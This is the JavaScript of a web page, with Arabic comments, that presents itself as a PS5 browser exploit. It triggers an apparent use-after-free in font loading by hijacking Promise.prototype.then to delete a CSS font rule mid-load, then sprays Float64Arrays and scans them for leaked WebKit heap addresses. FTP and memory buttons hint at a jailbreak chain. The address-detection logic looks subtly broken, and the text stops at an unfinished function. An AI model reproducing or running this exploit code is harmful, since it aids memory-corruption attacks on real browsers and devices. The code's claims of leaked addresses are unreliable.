<script>
"use strict";

// ===== إعدادات =====
const FAMILY_NAME = 'PS5FontExploit_' + Date.now();
const PROBE_TEXT = 'AB'; // حرفين: A (unicode U+0041) و B (unicode U+0042)
const FLOAT64_SPRAY_COUNT = 100; // عدد كائنات Float64Array للـ spray
const REALLOC_SIZE = 0x1000; // حجم إعادة التخصيص

// ===== المتغيرات العامة =====
let logEl = document.getElementById('log');
let btnRun = document.getElementById('btnRun');
let btnMem = document.getElementById('btnMem');
let btnFTP = document.getElementById('btnFTP');
let exploitTriggered = false;
let memoryLeakActive = false;
let leakedAddresses = [];
let sprayArrays = [];

// ===== التسجيل =====
function log(msg, type = 'info') {
    const now = new Date();
    const time = now.toLocaleTimeString();
    let color = '#aaa';
    if (type === 'ok') color = '#00ff88';
    else if (type === 'fail') color = '#ff4444';
    else if (type === 'warn') color = '#ffaa00';
    else if (type === 'data') color = '#66ccff';
    logEl.innerHTML += `<span style="color:${color}">[${time}] ${msg}</span>\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() {
    logEl.innerHTML = '';
}

// ===== الخطوة 1: إنشاء قواعد @font-face =====
function setupFontFaces() {
    log('1. إنشاء قواعد @font-face CSS-connected...', 'ok');
    
    // حذف أي style قديم
    const oldStyle = document.getElementById('font-style');
    if (oldStyle) oldStyle.remove();
    
    const style = document.createElement('style');
    style.id = 'font-style';
    style.textContent = `
        @font-face {
            font-family: '${FAMILY_NAME}';
            src: local('Arial'), local('Helvetica'), local('sans-serif');
            unicode-range: U+0041;
        }
        @font-face {
            font-family: '${FAMILY_NAME}';
            src: local('Arial'), local('Helvetica'), local('sans-serif');
            unicode-range: U+0042;
        }
    `;
    document.head.appendChild(style);
    
    // فرض تحميل الأنماط الأولي
    document.body.getBoundingClientRect();
    
    log(`    ╰─ العائلة: ${FAMILY_NAME}`, 'info');
    log(`    ╰─ القاعدتان CSS-connected`, 'ok');
    return style;
}

// ===== الخطوة 2: تثبيت Promise.prototype.then getter =====
function installThenGetter(styleEl) {
    log('2. تثبيت Promise.prototype.then getter...', 'ok');
    
    const originalThen = Object.getOwnPropertyDescriptor(Promise.prototype, 'then');
    let getterFired = false;
    let sheet = styleEl.sheet;
    
    Object.defineProperty(Promise.prototype, 'then', {
        configurable: true,
        get() {
            if (getterFired) return originalThen.value;
            getterFired = true;
            
            log('    ╰→ then getter اشتغل (same-stack)!', 'warn');
            
            // 2أ. حذف قواعد @font-face
            try {
                log('    ╰→ deleteRule(0)...', 'info');
                if (sheet && sheet.cssRules) {
                    const count = sheet.cssRules.length;
                    log(`    ╰→ عدد القواعد قبل الحذف: ${count}`, 'info');
                    
                    // نحذف القاعدة الأولى
                    sheet.deleteRule(0);
                    log('    ╰→ تم حذف القاعدة الأولى', 'ok');
                }
            } catch(e) {
                log(`    ╰→ خطأ في deleteRule: ${e.message}`, 'fail');
            }
            
            // 2ب. فرض تحديث الأنماط (style rebuild)
            try {
                log('    ╰→ فرض تحديث الأنماط...', 'info');
                document.body.getBoundingClientRect();
                // قياس إضافي لضمان flush
                void document.body.offsetWidth;
                log('    ╰→ تم تحديث الأنماط — CSSFontFace قد يكون محرّراً', 'warn');
            } catch(e) {
                log(`    ╰→ خطأ في style flush: ${e.message}`, 'fail');
            }
            
            // 2ج. إعادة الترميز الأصلي
            Object.defineProperty(Promise.prototype, 'then', originalThen);
            log('    ╰→ تم استعادة Promise.prototype.then الأصلي', 'ok');
            
            return originalThen.value;
        }
    });
    
    log('    ╰→ getter مثبت وجاهز', 'ok');
    return { getterFired: () => getterFired };
}

// ===== الخطوة 3: تشغيل document.fonts.load() =====
async function triggerFontLoad() {
    log('3. تشغيل document.fonts.load()...', 'ok');
    
    try {
        log(`    ╰→ font: "16px '${FAMILY_NAME}'"`, 'info');
        log(`    ╰→ text: "${PROBE_TEXT}" (حرفين، يتطلب قاعدتين مطابقتين)`, 'info');
        
        const faces = await document.fonts.load(`16px '${FAMILY_NAME}'`, PROBE_TEXT);
        
        log(`    ╰→ load() اكتمل بنجاح — ${faces.length} face(s)`, 'ok');
        
        // فحص النتائج
        for (let i = 0; i < faces.length; i++) {
            const f = faces[i];
            log(`    ╰→ face[${i}]: family="${f.family}", status="${f.status}"`, 'info');
        }
        
        return faces;
    } catch(e) {
        log(`    ╰→ load() فشل: ${e.message}`, 'fail');
        return null;
    }
}

// ===== الخطوة 4: Float64Array spray =====
function performSpray() {
    log('4. تنفيذ Float64Array spray...', 'ok');
    
    // تنظيف الـ spray القديم
    sprayArrays = [];
    
    const spraySize = 0x100; // 256 بايت لكل كائن
    const count = FLOAT64_SPRAY_COUNT;
    
    for (let i = 0; i < count; i++) {
        try {
            const arr = new Float64Array(spraySize / 8);
            // تعبئة بقيم معروفة
            for (let j = 0; j < arr.length; j++) {
                arr[j] = 0x41414141 + i + j; // قيم مميزة
            }
            sprayArrays.push(arr);
        } catch(e) {
            log(`    ╰→ خطأ في spray[${i}]: ${e.message}`, 'fail');
        }
    }
    
    log(`    ╰→ تم إنشاء ${sprayArrays.length} كائن Float64Array`, 'ok');
    log(`    ╰→ حجم كل كائن: ${spraySize} بايت`, 'info');
    return sprayArrays;
}

// ===== الخطوة 5: استغلال UAF — قراءة الذاكرة =====
async function exploitUAF() {
    log('5. تنفيذ UAF ومحاولة قراءة الذاكرة...', 'warn');
    
    // 5أ. حقن الـ spray في الذاكرة
    const sprayed = performSpray();
    if (sprayed.length < 10) {
        log('    ╰→ فشل الـ spray — عدد قليل جداً', 'fail');
        return false;
    }
    
    // 5ب. Forced GC
    log('    ╰→ فرض GC...', 'info');
    try {
        for (let i = 0; i < 5; i++) {
            const tmp = [];
            for (let j = 0; j < 100; j++) tmp.push(new ArrayBuffer(8192));
        }
    } catch(e) {}
    log('    ╰→ GC اكتمل', 'ok');
    
    // 5ج. التحقق من سلامة الـ spray
    let sprayOK = true;
    for (let i = 0; i < Math.min(5, sprayed.length); i++) {
        const arr = sprayed[i];
        if (!arr || arr.length === 0) {
            sprayOK = false;
            log(`    ╰→ spray[${i}] تالف!`, 'fail');
        }
    }
    
    if (!sprayOK) {
        log('    ╰→ الـ spray قد يكون متأثراً بـ UAF (هذا متوقع)', 'warn');
    } else {
        log('    ╰→ الـ spray يبدو سليماً', 'ok');
    }
    
    // 5د. فحص القيم غير الطبيعية
    log('    ╰→ فحص القيم غير الطبيعية في الـ spray...', 'info');
    for (let i = 0; i < sprayed.length; i++) {
        const arr = sprayed[i];
        if (!arr) continue;
        
        for (let j = 0; j < Math.min(arr.length, 20); j++) {
            const val = arr[j];
            // إذا القيمة تبدو كعنوان ذاكرة (أكبر من 0x1000000000000)
            if (val > 0x1000000000000 || (val > 0x10000 && val < 0x100000)) {
                const hex = '0x' + new DataView(new Float64Array([val]).buffer).getBigUint64(0).toString(16).padStart(16, '0');
                log(`    ╰→ ! قيمة غير طبيعية في spray[${i}][${j}]: ${hex}`, 'data');
                leakedAddresses.push(hex);
            }
        }
    }
    
    if (leakedAddresses.length > 0) {
        log(`    ╰→ تم تسريب ${leakedAddresses.length} قيمة مشبوهة`, 'ok');
        memoryLeakActive = true;
        btnMem.disabled = false;
        btnFTP.disabled = false;
        return true;
    } else {
        log('    ╰→ لم يتم العثور على قيم مشبوهة', 'info');
        log('    ╰→ حاول مرة أخرى مع تحسين الـ timing', 'info');
        return false;
    }
}

// ===== الخطوة الأساسية =====

// ===== فحص الذاكرة =====
function checkMemory() {
    log('');
    log('╔══════════════════════════════════════════╗', 'data');
    log('║  🔍 فحص الذاكرة                          ║', 'data');
    log('╚══════════════════════════════════════════╝', 'data');
    
    if (leakedAddresses.length === 0) {
        log('لا توجد عناوين مسربة', 'fail');
        return;
    }
    
    log(`تم العثور على ${leakedAddresses.length} عنوان:`, 'ok');
    for (let i = 0; i < leakedAddresses.length; i++) {
        log(`    ${i+1}. ${leakedAddresses[i]}`, 'data');
    }
    
    // تحليل العناوين
    log('');
    log('--- تحليل العناوين ---', 'info');
    for (const addr of leakedAddresses) {
        const bigVal = BigInt(addr);
        if (bigVal > 0x1a000000000n && bigVal < 0x1b000000000n) {
            log(`    ${addr} ← ⚡ WebKit heap address (0x1a...)`, 'data');
        } else if (bigVal > 0x2a000000000n && bigVal < 0x2b000000000n) {
            log(`    ${addr} ← ⚡ WebKit heap address (0x2a...)`, 'data');
        } else if (bigVal > 0x7f0000000000n) {
            log(`    ${addr} ← قد يكون Stack/Lib address`, 'data');
        } else {
            log(`    ${addr} ← عنوان غير معروف`, 'info');
        }
    }
}

function runSpray() {
